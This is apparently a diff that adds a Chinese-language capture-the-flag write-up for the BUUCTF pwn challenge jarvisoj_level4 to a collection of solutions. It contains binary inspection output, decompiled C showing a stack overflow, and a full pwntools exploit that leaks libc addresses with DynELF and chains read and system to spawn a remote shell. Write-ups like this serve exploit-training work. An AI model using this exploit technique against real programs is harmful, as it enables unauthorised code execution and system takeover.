@@ -2240,6 +2240,83 @@ io.interactive()
 
 ------
 
+### [jarvisoj_level4](https://buuoj.cn/challenges#jarvisoj_level4)
+
+先`file ./level4`查看文件类型，再`checksec --file=./level4`检查文件保护情况。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
+└─$ file ./level4         
+./level4: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=44cfbcb6b7104566b4b70e843bc97c0609b7a018, not stripped
+
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
+└─$ checksec --file=./level4         
+[*] '/home/tyd/ctf/pwn/buuctf/level4'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+用`IDA Pro 32bit`打开附件`level4`，按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  vulnerable_function();
+  write(1, "Hello, World!\n", 0xEu);
+  return 0;
+}
+```
+
+双击进入`vulnerable_function()`函数可以看到该函数中有一个`char`型局部变量`buf`，可用栈大小只有`0x88`个字节，但是`read()`函数读取时限制输入到`buf`的字节为`0x100`，显然存在栈溢出漏洞。
+
+```c
+ssize_t vulnerable_function()
+{
+  char buf[136]; // [esp+0h] [ebp-88h] BYREF
+  return read(0, buf, 0x100u);
+}
+```
+
+`DynELF`函数能通过已知函数迅速查找`libc`库，并不需要我们知道`libc`文件的版本，也不像使用`LibcSearcher`那样需要选择`libc`的版本。`DynELF`函数的使用前提是程序中存在可以泄露libc信息的漏洞，并且漏洞可以被反复触发。我们利用`DynELF`函数泄露出`system`函数的地址后，还需要知道`/bin/sh`的地址，程序中并没有`/bin/sh`，所以`ROPgadget`无法找到。程序是`NX enabled`，即开启了堆栈不可执行，但`/bin/sh`是参数并不是要执行的函数。我们可以利用`read`函数把`/bin/sh`读入到程序的`.bss`段中，然后使用`system`函数调用即可得到靶机的`shell`。
+
+编写`Python`代码求解可得`flag{44724d0a-a417-431b-b012-bafca1d45411}`。
+
+```python
+from pwn import *
+
+context(arch='i386', os='linux', log_level='debug')
+io = remote('node4.buuoj.cn', 25533)
+elf = ELF('./level4')
+main_addr = elf.symbols['main']  # 0x8048470
+write_plt = elf.plt['write']  # 0x8048340
+read_plt = elf.plt['read']  # 0x8048310
+bss_addr = elf.bss()  # 0x804a024
+padding = b'a'*(0x88+0x4)
+
+def leak(address):
+    payload = padding + p32(write_plt) + p32(main_addr) + p32(1) + p32(address) + p32(4)
+    io.sendline(payload)
+    leaked = io.recv(4)
+    log.info("[%#x] => %s = %s" % (address, repr(leaked), hex(u32(leaked))))
+    return leaked
+
+
+d = DynELF(leak, elf=elf)
+system_addr = d.lookup('system', 'libc')
+log.success('system_address => %#x' % system_addr)
+payload = padding + p32(read_plt) + p32(main_addr) + p32(0) + p32(bss_addr) + p32(8)
+io.send(payload)
+io.send('/bin/sh\x00')
+payload = padding + p32(system_addr) + p32(main_addr) + p32(bss_addr)
+io.sendline(payload)
+io.interactive()
+```
+
+------
+
 ## ADWorld
 
 ### [get_shell](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5049)
